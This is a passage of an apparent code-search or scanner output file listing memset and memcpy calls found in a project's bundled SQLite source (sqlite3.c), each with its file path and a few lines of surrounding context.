            memcpy( state + t[i + 1].start, elem, strlen(elem) );
            memcpy( state + t[i + 1].start + strlen(elem), end, strlen(end) );
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"# define DbMaskZero(M)      memset((M),0,sizeof(M))",120,1,"  typedef unsigned char yDbMask[(SQLITE_MAX_ATTACHED+9)/8];
# define DbMaskTest(M,I)    (((M)[(I)/8]&(1<<((I)&7)))!=0)
# define DbMaskZero(M)      memset((M),0,sizeof(M))
# define DbMaskSet(M,I)     (M)[(I)/8]|=(1<<((I)&7))
# define DbMaskAllZero(M)   sqlite3DbMaskAllZero(M)
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"# define sqlite3StackAllocZero(D,N)  memset(alloca(N), 0, N)",120,1,"#ifdef SQLITE_USE_ALLOCA
# define sqlite3StackAllocRaw(D,N)   alloca(N)
# define sqlite3StackAllocZero(D,N)  memset(alloca(N), 0, N)
# define sqlite3StackFree(D,P)
#else
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zBufOut, 0, nByte);",120,1,"SQLITE_PRIVATE int sqlite3OsRandomness(sqlite3_vfs *pVfs, int nByte, char *zBufOut){
  if( sqlite3Config.iPrngSeed ){
    memset(zBufOut, 0, nByte);
    if( ALWAYS(nByte>(signed)sizeof(unsigned)) ) nByte = sizeof(unsigned int);
    memcpy(zBufOut, &sqlite3Config.iPrngSeed, nByte);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(((char*)pInt)+nByte, 0x65, nReserve-nByte);",120,1,"    pInt[nReserve/sizeof(int)] = REARGUARD;
    randomFill((char*)pInt, nByte);
    memset(((char*)pInt)+nByte, 0x65, nReserve-nByte);
    p = (void*)pInt;
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&mem5.zPool[i*mem5.szAtom], 0xAA, iFullSz);",120,1,"  /* Make sure the allocated memory does not assume that it is set to zero
  ** or retains a value from a previous allocation */
  memset(&mem5.zPool[i*mem5.szAtom], 0xAA, iFullSz);
#endif

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&mem5.zPool[iBlock*mem5.szAtom], 0x55, size);",120,1,"  /* Overwrite freed memory with the 0x55 bit pattern to verify that it is
  ** not used after being freed */
  memset(&mem5.zPool[iBlock*mem5.szAtom], 0x55, size);
#endif

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"if( rc!=SQLITE_OK ) memset(&mem0, 0, sizeof(mem0));",120,1,"  }
  rc = sqlite3GlobalConfig.m.xInit(sqlite3GlobalConfig.m.pAppData);
  if( rc!=SQLITE_OK ) memset(&mem0, 0, sizeof(mem0));
  return rc;
}
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0xaa, LOOKASIDE_SMALL);  */",120,1,"        LookasideSlot *pBuf = (LookasideSlot*)p;
#ifdef SQLITE_DEBUG
        memset(p, 0xaa, LOOKASIDE_SMALL);  /* Trash freed content */
#endif
        pBuf->pNext = db->lookaside.pSmallFree;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0xaa, db->lookaside.szTrue);  */",120,1,"        LookasideSlot *pBuf = (LookasideSlot*)p;
#ifdef SQLITE_DEBUG
        memset(p, 0xaa, db->lookaside.szTrue);  /* Trash freed content */
#endif
        pBuf->pNext = db->lookaside.pFree;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aErr, 0, sizeof(aErr));",120,1,"#if SQLITE_THREADSAFE && defined(HAVE_STRERROR_R)
  char aErr[80];
  memset(aErr, 0, sizeof(aErr));
  zErr = aErr;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pMem, 0, nMap);",120,1,"          goto shmpage_out;
        }
        memset(pMem, 0, nMap);
      }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aLock, 0, sizeof(aLock));",120,1,"  assert( sqlite3_mutex_held(pShmNode->pShmMutex) );

  memset(aLock, 0, sizeof(aLock));
  for(pX=pShmNode->pFirst; pX; pX=pX->pNext){
    int i;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&aLock[ofst], 0, sizeof(int)*n);",120,1,"        rc = unixShmSystemLock(pDbFd, F_UNLCK, ofst+UNIX_SHM_BASE, n);
        if( rc==SQLITE_OK ){
          memset(&aLock[ofst], 0, sizeof(int)*n);
        }
      }else if( ALWAYS(p->sharedMask & (1<<ofst)) ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, sizeof(unixFile));",120,1,"    goto end_create_proxy;
  }
  memset(pNew, 0, sizeof(unixFile));
  pNew->openFlags = openFlags;
  memset(&dummyVfs, 0, sizeof(dummyVfs));
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&dummyVfs, 0, sizeof(dummyVfs));",120,1,"  memset(pNew, 0, sizeof(unixFile));
  pNew->openFlags = openFlags;
  memset(&dummyVfs, 0, sizeof(dummyVfs));
  dummyVfs.pAppData = (void*)&autolockIoFinder;
  dummyVfs.zName = ""dummy"";
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pHostID, 0, PROXY_HOSTIDLEN);",120,1,"static int proxyGetHostID(unsigned char *pHostID, int *pError){
  assert(PROXY_HOSTIDLEN == sizeof(uuid_t));
  memset(pHostID, 0, PROXY_HOSTIDLEN);
#if HAVE_GETHOSTUUID
  {
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&conchModTime, 0, sizeof(conchModTime));",120,1,"  struct timespec conchModTime;

  memset(&conchModTime, 0, sizeof(conchModTime));
  do {
    rc = conchFile->pMethod->xLock((sqlite3_file*)conchFile, lockType);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCtx, 0, sizeof(*pCtx));",120,1,"    return SQLITE_NOMEM_BKPT;
  }
  memset(pCtx, 0, sizeof(*pCtx));

  rc = proxyCreateConchPathname(dbPath, &pCtx->conchFilePath);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zDbgBuf, 0, SQLITE_WIN32_DBG_BUF_SIZE);",120,1,"#if defined(SQLITE_WIN32_HAS_ANSI)
  if( nMin>0 ){
    memset(zDbgBuf, 0, SQLITE_WIN32_DBG_BUF_SIZE);
    memcpy(zDbgBuf, zBuf, nMin);
    osOutputDebugStringA(zDbgBuf);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pFile->local, 0, sizeof(pFile->local));",120,1,"
  /* Initialize the local lockdata */
  memset(&pFile->local, 0, sizeof(pFile->local));

  /* Replace the backslashes from the filename and lowercase it
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pFile->shared, 0, sizeof(winceLock));",120,1,"  /* Initialize the shared memory if we're supposed to */
  if( bInit ){
    memset(pFile->shared, 0, sizeof(winceLock));
  }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&ovlp, 0, sizeof(OVERLAPPED));",120,1,"  if( osIsNT() ){
    OVERLAPPED ovlp;
    memset(&ovlp, 0, sizeof(OVERLAPPED));
    ovlp.Offset = offsetLow;
    ovlp.OffsetHigh = offsetHigh;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&overlapped, 0, sizeof(OVERLAPPED));",120,1,"  while( !osReadFile(pFile->h, pBuf, amt, &nRead, 0) ){
#else
  memset(&overlapped, 0, sizeof(OVERLAPPED));
  overlapped.Offset = (LONG)(offset & 0xffffffff);
  overlapped.OffsetHigh = (LONG)((offset>>32) & 0x7fffffff);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&((char*)pBuf)[nRead], 0, amt-nRead);",120,1,"  if( nRead<(DWORD)amt ){
    /* Unread parts of the buffer must be zero-filled */
    memset(&((char*)pBuf)[nRead], 0, amt-nRead);
    OSTRACE((""READ pid=%lu, pFile=%p, file=%p, rc=SQLITE_IOERR_SHORT_READ\n"",
             osGetCurrentProcessId(), pFile, pFile->h));
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sAttrData, 0, sizeof(sAttrData));",120,1,"    int cnt = 0;
    WIN32_FILE_ATTRIBUTE_DATA sAttrData;
    memset(&sAttrData, 0, sizeof(sAttrData));
    while( !(rc = osGetFileAttributesExW((LPCWSTR)zConverted,
                             GetFileExInfoStandard,
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pFile, 0, sizeof(winFile));",120,1,"
  assert( pFile!=0 );
  memset(pFile, 0, sizeof(winFile));
  pFile->h = INVALID_HANDLE_VALUE;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&id, 0, sizeof(UUID));",120,1,"  {
    UUID id;
    memset(&id, 0, sizeof(UUID));
    osUuidCreate(&id);
    xorMemory(&e, (unsigned char*)&id, sizeof(UUID));
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&winSysInfo, 0, sizeof(SYSTEM_INFO));",120,1,"
  /* get memory map allocation granularity */
  memset(&winSysInfo, 0, sizeof(SYSTEM_INFO));
#if SQLITE_OS_WINRT
  osGetNativeSystemInfo(&winSysInfo);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(zBuf, 0, iAmt);",120,1,"  MemFile *p = (MemFile *)pFile;
  if( iOfst+iAmt>p->sz ){
    memset(zBuf, 0, iAmt);
    if( iOfst<p->sz ) memcpy(zBuf, p->aData+iOfst, p->sz - iOfst);
    return SQLITE_IOERR_SHORT_READ;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"if( iOfst>p->sz ) memset(p->aData+p->sz, 0, iOfst-p->sz);",120,1,"      return rc;
    }
    if( iOfst>p->sz ) memset(p->aData+p->sz, 0, iOfst-p->sz);
    p->sz = iOfst+iAmt;
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pTo, 0, szPage);",120,1,"            memcpy(pTo, sqlite3PagerGetData(pPage), szPage);
          }else{
            memset(pTo, 0, szPage);
          }
          sqlite3PagerUnref(pPage);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pPgHdr->pDirty, 0, sizeof(PgHdr) - offsetof(PgHdr,pDirty));",120,1,"  pPgHdr = (PgHdr*)pPage->pExtra;
  assert( pPgHdr->pPage==0 );
  memset(&pPgHdr->pDirty, 0, sizeof(PgHdr) - offsetof(PgHdr,pDirty));
  pPgHdr->pPage = pPage;
  pPgHdr->pData = pPage->pBuf;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pPgHdr->pExtra, 0, 8);",120,1,"  pPgHdr->pData = pPage->pBuf;
  pPgHdr->pExtra = (void *)&pPgHdr[1];
  memset(pPgHdr->pExtra, 0, 8);
  pPgHdr->pCache = pCache;
  pPgHdr->pgno = pgno;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pcache1, 0, sizeof(pcache1));",120,1,"  UNUSED_PARAMETER(NotUsed);
  assert( pcache1.isInit==0 );
  memset(&pcache1, 0, sizeof(pcache1));


"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&zSuper[-4], 0, 4);",120,1,"    */
    assert( zSuper==&pPager->pTmpSpace[4] );
    memset(&zSuper[-4], 0, 4);
    rc = pager_delsuper(pPager, zSuper);
    testcase( rc!=SQLITE_OK );
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew+pageSize, 0, 8);",120,1,"        rc = SQLITE_NOMEM_BKPT;
      }else{
        memset(pNew+pageSize, 0, 8);
      }
    }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p->pExtra, 0, 8);",120,1,"    p->pDirty = 0;
    assert( pPager->nExtra>=8 );
    memset(p->pExtra, 0, 8);
  }else{
    *ppPage = p = (PgHdr *)sqlite3MallocZero(sizeof(PgHdr) + pPager->nExtra);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset((void *)&sLoc.aPgno[iLimit+1], 0, nByte);",120,1,"  */
  nByte = (int)((char *)sLoc.aHash - (char *)&sLoc.aPgno[iLimit+1]);
  memset((void *)&sLoc.aPgno[iLimit+1], 0, nByte);

#ifdef SQLITE_ENABLE_EXPENSIVE_ASSERT
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset((void*)&sLoc.aPgno[1], 0, nByte);",120,1,"      int nByte = (int)((u8 *)&sLoc.aHash[HASHTABLE_NSLOT]
                               - (u8 *)&sLoc.aPgno[1]);
      memset((void*)&sLoc.aPgno[1], 0, nByte);
    }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(((u8*)pKey)+pCur->nKey, 0, 9+8);",120,1,"      rc = sqlite3BtreePayload(pCur, 0, (int)pCur->nKey, pKey);
      if( rc==SQLITE_OK ){
        memset(((u8*)pKey)+pCur->nKey, 0, 9+8);
        pCur->pKey = pKey;
      }else{
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, offsetof(BtCursor, BTCURSOR_FIRST_UNINIT));",120,1,"*/
SQLITE_PRIVATE void sqlite3BtreeCursorZero(BtCursor *p){
  memset(p, 0, offsetof(BtCursor, BTCURSOR_FIRST_UNINIT));
}

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&info, 0, sizeof(info));",120,1,"  static void assertCellInfo(BtCursor *pCur){
    CellInfo info;
    memset(&info, 0, sizeof(info));
    btreeParseCell(pCur->pPage, pCur->ix, &info);
    assert( CORRUPT_DB || cellInfoEqual(&info, &pCur->info) );
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(((u8*)pCellKey)+nCell,0,nOverrun); */",120,1,"          pCur->ix = (u16)idx;
          rc = accessPayload(pCur, 0, nCell, (unsigned char*)pCellKey, 0);
          memset(((u8*)pCellKey)+nCell,0,nOverrun); /* Fix uninit warnings */
          pCur->curFlags &= ~BTCF_ValidOvfl;
          if( rc ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pPayload+nSrc, 0, nPayload-nSrc);",120,1,"    testcase( nSrc<nPayload );
    memcpy(pPayload, pSrc, nSrc);
    memset(pPayload+nSrc, 0, nPayload-nSrc);
    return SQLITE_OK;
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(apOld, 0, (i)*sizeof(MemPage*));",120,1,"      rc = btreeComputeFreeSpace(apOld[i]);
      if( rc ){
        memset(apOld, 0, (i)*sizeof(MemPage*));
        goto balance_cleanup;
      }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pDest + i, 0, iAmt - i);",120,1,"      int rc = sqlite3PagerWrite(pPage->pDbPage);
      if( rc ) return rc;
      memset(pDest + i, 0, iAmt - i);
    }
  }else{
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sParse, 0, sizeof(sParse));",120,1,"    Parse sParse;
    int rc = 0;
    memset(&sParse, 0, sizeof(sParse));
    sParse.db = pDb;
    if( sqlite3OpenTempDatabase(&sParse) ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&p->aOp, 0, sizeof(Vdbe)-offsetof(Vdbe,aOp));",120,1,"  p = sqlite3DbMallocRawNN(db, sizeof(Vdbe) );
  if( p==0 ) return 0;
  memset(&p->aOp, 0, sizeof(Vdbe)-offsetof(Vdbe,aOp));
  p->db = db;
  if( db->pVdbe ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sIter, 0, sizeof(sIter));",120,1,"  Op *pOp;
  VdbeOpIter sIter;
  memset(&sIter, 0, sizeof(sIter));
  sIter.v = v;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p->apCsr, 0, nCursor*sizeof(VdbeCursor*));",120,1,"    p->nMem = nMem;
    initMemArray(p->aMem, nMem, db, MEM_Undefined);
    memset(p->apCsr, 0, nCursor*sizeof(VdbeCursor*));
#ifdef SQLITE_ENABLE_STMT_SCANSTATUS
    memset(p->anExec, 0, p->nOp*sizeof(i64));
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p->anExec, 0, p->nOp*sizeof(i64));",120,1,"    memset(p->apCsr, 0, nCursor*sizeof(VdbeCursor*));
#ifdef SQLITE_ENABLE_STMT_SCANSTATUS
    memset(p->anExec, 0, p->nOp*sizeof(i64));
#endif
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&preupdate, 0, sizeof(PreUpdate));",120,1,"
  assert( db->pPreUpdate==0 );
  memset(&preupdate, 0, sizeof(PreUpdate));
  if( HasRowid(pTab)==0 ){
    iKey1 = iKey2 = 0;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRet->aMem, 0, sizeof(Mem)*(pKeyInfo->nKeyField+1));",120,1,"  pRet = sqlite3VdbeAllocUnpackedRecord(pKeyInfo);
  if( pRet ){
    memset(pRet->aMem, 0, sizeof(Mem)*(pKeyInfo->nKeyField+1));
    sqlite3VdbeRecordUnpack(pKeyInfo, nKey, pKey, pRet);
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p->anExec, 0, p->nOp * sizeof(i64));",120,1,"SQLITE_API void sqlite3_stmt_scanstatus_reset(sqlite3_stmt *pStmt){
  Vdbe *p = (Vdbe*)pStmt;
  memset(p->anExec, 0, p->nOp * sizeof(i64));
}
#endif /* SQLITE_ENABLE_STMT_SCANSTATUS */
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCx, 0, offsetof(VdbeCursor,pAltCursor));",120,1,"  if( SQLITE_OK==sqlite3VdbeMemClearAndResize(pMem, nByte) ){
    p->apCsr[iCur] = pCx = (VdbeCursor*)pMem->z;
    memset(pCx, 0, offsetof(VdbeCursor,pAltCursor));
    pCx->eCurType = eCurType;
    pCx->iDb = iDb;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pFrame->aOnce, 0, (pProgram->nOp + 7)/8);",120,1,"  p->apCsr = (VdbeCursor **)&aMem[p->nMem];
  pFrame->aOnce = (u8*)&p->apCsr[pProgram->nCsr];
  memset(pFrame->aOnce, 0, (pProgram->nOp + 7)/8);
  p->aOp = aOp = pProgram->aOp;
  p->nOp = pProgram->nOp;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sParse, 0, sizeof(Parse));",120,1,"  pBlob = (Incrblob *)sqlite3DbMallocZero(db, sizeof(Incrblob));
  do {
    memset(&sParse, 0, sizeof(Parse));
    if( !pBlob ) goto blob_open_out;
    sParse.db = db;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aSlot, 0, sizeof(aSlot));",120,1,"  p = pList->pList;
  pTask->xCompare = vdbeSorterGetCompare(pTask->pSorter);
  memset(aSlot, 0, sizeof(aSlot));

  while( p ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCur, 0, sizeof(*pCur));",120,1,"  pCur = sqlite3_malloc( sizeof(*pCur) );
  if( pCur==0 ) return SQLITE_NOMEM;
  memset(pCur, 0, sizeof(*pCur));
  sqlite3VdbeMemInit(&pCur->sub, pVTab->db, 1);
  *ppCursor = &pCur->base;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sWalker, 0, sizeof(Walker));",120,1,"  if( pSelect->pWin ){
    Walker sWalker;
    memset(&sWalker, 0, sizeof(Walker));
    sWalker.xExprCallback = resolveRemoveWindowsCb;
    sWalker.u.pSelect = pSelect;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(Expr));",120,1,"  p = sqlite3DbMallocRawNN(pParse->db, sizeof(Expr));
  if( p ){
    memset(p, 0, sizeof(Expr));
    p->op = op & 0xff;
    p->iAgg = -1;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&zAlloc[nSize], 0, EXPR_FULLSIZE-nSize);",120,1,"      memcpy(zAlloc, p, nSize);
      if( nSize<EXPR_FULLSIZE ){
        memset(&zAlloc[nSize], 0, EXPR_FULLSIZE-nSize);
      }
    }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pItem->zEName,0,sizeof(*pItem)-offsetof(struct ExprList_item,zEName));",120,1,"  assert( offsetof(struct ExprList_item,zEName)==sizeof(pItem->pExpr) );
  assert( offsetof(struct ExprList_item,pExpr)==0 );
  memset(&pItem->zEName,0,sizeof(*pItem)-offsetof(struct ExprList_item,zEName));
  pItem->pExpr = pExpr;
  return pList;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&caseExpr, 0, sizeof(caseExpr));",120,1,"    case INLINEFUNC_iif: {
      Expr caseExpr;
      memset(&caseExpr, 0, sizeof(caseExpr));
      caseExpr.op = TK_CASE;
      caseExpr.x.pList = pFarg;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&opCompare, 0, sizeof(opCompare));",120,1,"        exprToRegister(pDel, exprCodeVector(pParse, pDel, &regFree1));
        testcase( regFree1==0 );
        memset(&opCompare, 0, sizeof(opCompare));
        opCompare.op = TK_EQ;
        opCompare.pLeft = pDel;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&compLeft, 0, sizeof(Expr));",120,1,"  sqlite3 *db = pParse->db;

  memset(&compLeft, 0, sizeof(Expr));
  memset(&compRight, 0, sizeof(Expr));
  memset(&exprAnd, 0, sizeof(Expr));
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&compRight, 0, sizeof(Expr));",120,1,"
  memset(&compLeft, 0, sizeof(Expr));
  memset(&compRight, 0, sizeof(Expr));
  memset(&exprAnd, 0, sizeof(Expr));

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&exprAnd, 0, sizeof(Expr));",120,1,"  memset(&compLeft, 0, sizeof(Expr));
  memset(&compRight, 0, sizeof(Expr));
  memset(&exprAnd, 0, sizeof(Expr));

  assert( !ExprHasProperty(pExpr, EP_xIsSelect) );
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pWalker, 0, sizeof(*pWalker));",120,1,"*/
SQLITE_PRIVATE void sqlite3AggInfoPersistWalkerInit(Walker *pWalker, Parse *pParse){
  memset(pWalker, 0, sizeof(*pWalker));
  pWalker->pParse = pParse;
  pWalker->xExprCallback = agginfoPersistExprCb;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(Parse));",120,1,"  ** occurs and the parse does not result in a new table, index or
  ** trigger object, the database must be corrupt. */
  memset(p, 0, sizeof(Parse));
  p->eParseMode = PARSE_MODE_RENAME;
  p->db = db;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sCtx, 0, sizeof(RenameCtx));",120,1,"    sqlite3BtreeEnterAll(db);

    memset(&sCtx, 0, sizeof(RenameCtx));
    sCtx.pTab = sqlite3FindTable(db, zOld, zDb);
